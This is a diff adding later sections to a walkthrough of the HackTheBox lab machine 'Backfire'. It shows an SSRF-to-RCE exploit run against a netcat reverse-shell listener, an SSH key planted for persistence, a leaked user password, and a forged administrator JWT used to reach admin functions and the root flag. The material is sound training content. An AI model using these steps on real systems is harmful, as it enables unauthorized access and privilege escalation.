@@ -393,7 +393,7 @@ python -m http.server
 sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
 ```
 (Note: Make sure they are in seperate terminals and run them one after another)
-### My Machine 
+### 🧑‍💻My Machine 
 ```
 nc -lnvp 40056
 listening on [any] 40056 ...
@@ -423,5 +423,47 @@ sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
 [***] Success!
 ```
 ### 🧑‍💻 Getting a Shell/User.txt
+After RCE, stabilize your shell. I Generated an SSH key:
+```
+ssh-keygen -t ed25519
+```
+Add the public key to ~/.ssh/authorized_keys on the target and ssh into the machine.
+```
+ssh -i id_ed25519 ilya@<Target-IP>
+```
+## 🪜 Privilege Escalation
+Switch to another user using leaked creds:
+User: `sergej`
+Pass: `1w4nt2sw1tch2h4rdh4tc2`
+```
+su sergej
+```
+### JWT Exploitation
+A JWT-generating script was found. Modify it:
+```
+payload = {
+    "sub": "HardHat_Admin",
+    "role": "Administrator",
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 600
+}
+```
+Use the JWT to access admin functions:
+```
+curl -H "Authorization: Bearer <TOKEN>" http://127.0.0.1:5000/admin
+```
+## 🔐 Root Flag
+After getting admin access:
+```
+cat /root/root.txt
+```
+
+## ✅ Conclusion
+This box was rated MEDIUM on HacktheBox but as always medium doesnt actually mean medium..
+as it took me over 5 days to even break the first SSRF_RCE.py script.
+The lessons learned here was to never give up, the power of SSRF to RCE, local privilege escalation through
+misconfigurations, and practical usage of JWTs in exploitation. I hope you enjoyed!
+
+
 
 
